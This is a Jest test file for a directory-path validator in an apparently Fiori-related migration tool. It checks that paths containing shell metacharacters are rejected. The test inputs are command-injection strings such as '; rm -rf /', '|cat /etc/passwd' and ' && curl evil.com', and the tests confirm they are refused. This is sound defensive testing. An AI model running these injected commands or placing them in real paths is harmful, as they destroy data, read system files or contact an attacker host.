import { join } from 'node:path';
import { mkdirSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { validateRootDirectory } from '../../../src/migration-process/legacy-helpers.js';

describe('Path Validation Security', () => {
    const testRoot = join(tmpdir(), 'fiori-migration-test-' + Date.now());

    beforeAll(() => {
        mkdirSync(testRoot, { recursive: true });
    });

    afterAll(() => {
        rmSync(testRoot, { recursive: true, force: true });
    });

    describe('Shell metacharacter rejection', () => {
        test('should reject paths with backticks', async () => {
            const maliciousPath = testRoot + '`whoami`';
            await expect(validateRootDirectory(maliciousPath)).rejects.toThrow('Path contains unsafe characters');
        });

        test('should reject paths with dollar signs', async () => {
            const maliciousPath = testRoot + '$(whoami)';
            await expect(validateRootDirectory(maliciousPath)).rejects.toThrow('Path contains unsafe characters');
        });

        test('should reject paths with pipes', async () => {
            const maliciousPath = testRoot + '|cat /etc/passwd';
            await expect(validateRootDirectory(maliciousPath)).rejects.toThrow('Path contains unsafe characters');
        });

        test('should reject paths with semicolons', async () => {
            const maliciousPath = testRoot + '; rm -rf /';
            await expect(validateRootDirectory(maliciousPath)).rejects.toThrow('Path contains unsafe characters');
        });

        test('should reject paths with ampersands', async () => {
            const maliciousPath = testRoot + ' && curl evil.com';
            await expect(validateRootDirectory(maliciousPath)).rejects.toThrow('Path contains unsafe characters');
        });

        test('should reject paths with redirects', async () => {
            const maliciousPath = testRoot + ' > /tmp/evil';
            await expect(validateRootDirectory(maliciousPath)).rejects.toThrow('Path contains unsafe characters');
        });

        test('should reject paths with null bytes', async () => {
            const maliciousPath = testRoot + '\0';
            await expect(validateRootDirectory(maliciousPath)).rejects.toThrow('Path contains unsafe characters');
        });

        test('should reject paths with newlines', async () => {
            const maliciousPath = testRoot + '\nrm -rf /';
            await expect(validateRootDirectory(maliciousPath)).rejects.toThrow('Path contains unsafe characters');
        });

        test('should accept normal project paths', async () => {
            const validated = await validateRootDirectory(testRoot);
            expect(validated).toBeTruthy();
        });

        test('should accept paths with spaces, dashes, underscores', async () => {
            const validPath = join(testRoot, 'my-project_v2 (copy)');
            mkdirSync(validPath, { recursive: true });

            const validated = await validateRootDirectory(validPath);
            expect(validated).toBeTruthy();
        });
    });

    describe('Non-existent directory handling', () => {
        test('should reject non-existent root directory', async () => {
            const nonExistentPath = join(testRoot, 'does-not-exist-' + Date.now());
            await expect(validateRootDirectory(nonExistentPath)).rejects.toThrow('Root directory does not exist');
        });
    });
});
